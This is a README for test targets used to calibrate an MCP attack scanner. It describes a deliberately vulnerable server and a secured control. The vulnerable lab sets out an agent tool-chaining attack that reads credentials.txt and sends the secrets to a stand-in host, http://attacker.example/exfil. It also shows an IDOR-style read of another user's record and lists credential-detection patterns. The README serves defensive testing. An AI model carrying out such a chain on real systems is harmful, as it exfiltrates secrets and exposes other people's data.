# test-lab — MCP server test targets

> ## ⚠️ TEST TARGETS ONLY
>
> Both servers in this directory exist solely for testing `mcp-attack-scanner`.
>
> - **Never** expose either server on a network or bind it to a public interface.
> - **Never** run them against real files or a real webhook.
> - They are kept out of the shipped tool on purpose — they live here, not in
>   `mcp_attack_scanner/`.
>
> All data is fake and all "network" activity is simulated.

## Why this exists

`mcp-attack-scanner` does **dynamic** testing — it needs live MCP servers to
attack. This directory contains two:

| Lab | Purpose | Expected scan result |
| --- | --- | --- |
| `vulnerable_mcp_lab/` | True positive — has both vulnerabilities | **2 findings** (tool-chaining exfiltration, permission escalation) |
| `clean_mcp_lab/` | False-positive control — same tools, properly secured | **0 findings** |

Together they form the ground truth for calibrating the scanner: it should find
both vulnerabilities in the first and stay quiet for the second. Every attack
category the scanner implements gets a matching pair — a tool that is exploitable
in the vulnerable lab and the same tool, defended, in the clean lab.

---

## vulnerable_mcp_lab

### Tools exposed

| Tool | Behavior | Safety |
| --- | --- | --- |
| `read_file(path)` | Reads a text file from the sandbox | Contained — path traversal outside the sandbox is rejected |
| `list_files(directory=".")` | Lists entries in the sandbox | Contained — same sandbox check |
| `send_notification(message, webhook_url)` | "Sends" a notification | **Simulated** — appends to `notifications.log`, makes no real HTTP call |
| `get_user_record(user_id)` | Returns one record from a small in-memory user directory | **Fake people** — three invented users; the SSN-shaped field uses the `900-xx-xxxx` range, which has never been issued |

### Intended vulnerability 1 — tool-chaining exfiltration

There is **no data-flow or egress control**. Nothing stops an agent from
chaining:

```
read_file("credentials.txt")  ->  send_notification(message=<those secrets>, webhook_url=<attacker>)
```

That read-then-exfiltrate chain is the exact behavior `mcp-attack-scanner` is
meant to catch. The file tools themselves are properly sandboxed on purpose —
the lab demonstrates *tool-chaining abuse*, not arbitrary file read.

### Intended vulnerability 2 — permission escalation (broken authorization)

`get_user_record` is documented as *"Get the current user's own account
record"*, but it takes the identity it operates on as an ordinary parameter and
never checks it against any notion of who is calling:

```
get_user_record("u1")  ->  Ada Nguyen's record      (plausibly "ours")
get_user_record("u2")  ->  Bruno Okafor's record    (someone else's, no authorization)
```

This is the MCP equivalent of an IDOR: the tool's self-scoped contract exists
only in its description, not in its code. An id nobody owns still raises a plain
lookup error — the flaw is specifically that a *valid* id belonging to *another*
user is served without a check.

### Usage

```bash
cd test-lab

# 1. Populate the sandbox with fake files (incl. credentials.txt)
python -m vulnerable_mcp_lab.seed

# 2. Scan (should report 2 findings)
mcp-attack-scanner scan --transport stdio \
  --command python --arg -m --arg vulnerable_mcp_lab.server
```

---

## clean_mcp_lab

### Tools exposed

Same four tools, same sandbox, same seeded `credentials.txt`, same fake user
directory — but with egress control on `send_notification` and identity scoping
on `get_user_record`:

| Tool | Behavior | Safety |
| --- | --- | --- |
| `read_file(path)` | Reads a text file from the sandbox | Contained — same sandbox check as `vulnerable_mcp_lab` |
| `list_files(directory=".")` | Lists entries in the sandbox | Contained — same sandbox check |
| `send_notification(message, webhook_url)` | "Sends" a notification | **Two controls:** destination must be on an explicit allowlist, and message content is scanned for credential patterns. Either check failing refuses the send. Accepted sends are still only logged locally. |
| `get_user_record(user_id)` | Returns the session's own record | **Scope enforced:** `user_id` must equal `CURRENT_SESSION_USER`; any other id is refused with an authorization error |

### Why this blocks exfiltration

1. **Destination allowlist.** The webhook URL must be HTTPS and its host must
   be in `ALLOWED_WEBHOOK_HOSTS` (currently two `.test` hostnames). The
   attacker-controlled `http://attacker.example/exfil` that the scanner uses is
   refused because it is not on the list (and is not HTTPS).

2. **Outbound content inspection.** Even if an allowlisted destination were
   used, the message body is scanned for credential-shaped patterns (AWS keys,
   `password=`/`token=`/`secret=` assignments with actual values, private key
   blocks, bearer tokens). Anything matching is refused.

Both controls fail closed: the tool returns an error, so the scanner sees the
send call fail and does not count it as a successful exfiltration chain.

### Why this blocks permission escalation

`get_user_record` compares the requested `user_id` against
`CURRENT_SESSION_USER` (hardcoded to `"u1"`, since the lab has no real auth
system) and refuses anything else:

```
get_user_record("u1")  ->  Ada Nguyen's record
get_user_record("u2")  ->  error: authorization denied: this session is 'u1' and
                           may only read its own record, not 'u2'
```

The identity is never read from tool arguments, so a caller cannot influence
which record is in scope. The refusal raises, so the scanner sees `isError=True`
on the cross-identity call and records nothing.

This still exercises the scanner properly rather than passing vacuously: the
baseline call for `u1` *succeeds* and returns a real record, so the module gets
as far as probing — and then the boundary holds.

### Usage

```bash
cd test-lab

# 1. Populate the sandbox with fake files
python -m clean_mcp_lab.seed

# 2. Scan (should report 0 findings)
mcp-attack-scanner scan --transport stdio \
  --command python --arg -m --arg clean_mcp_lab.server
```

---

## Layout

```
test-lab/
├── README.md
├── .gitignore
├── vulnerable_mcp_lab/
│   ├── __init__.py
│   ├── server.py                  # the 4-tool vulnerable MCP server
│   ├── seed.py                    # writes fake files into sandbox/
│   ├── sandbox/                   # generated by seed.py (gitignored)
│   └── notifications.log          # generated by send_notification (gitignored)
└── clean_mcp_lab/
    ├── __init__.py
    ├── server.py                  # the 4-tool secured MCP server
    ├── seed.py                    # writes identical fake files
    ├── sandbox/                   # generated by seed.py (gitignored)
    └── notifications.log          # generated by send_notification (gitignored)
```

## Containment guarantees (both labs)

- **Filesystem:** `read_file` / `list_files` resolve every path against the
  sandbox root and reject anything that escapes it. Real system files are not
  reachable.
- **Network:** `send_notification` in both labs performs no real HTTP request.
  It only writes a line to `notifications.log`.
- **Data:** the only "secrets" present are the obviously fake values written by
  `seed.py` (AWS's public documentation example keys, a dummy DB password, and
  a fake API token). The three user records in `USER_RECORDS` are invented
  people at `.test` addresses that resolve nowhere, and their SSN-shaped field
  uses the `900-xx-xxxx` range that the SSA has never issued — no value in
  either lab can collide with a real person or a real credential.
- **Identity:** neither lab has an authentication system. The clean lab's
  "current session user" is a hardcoded constant, which is enough to demonstrate
  an enforced scope check; it is not a model of how real auth should work.
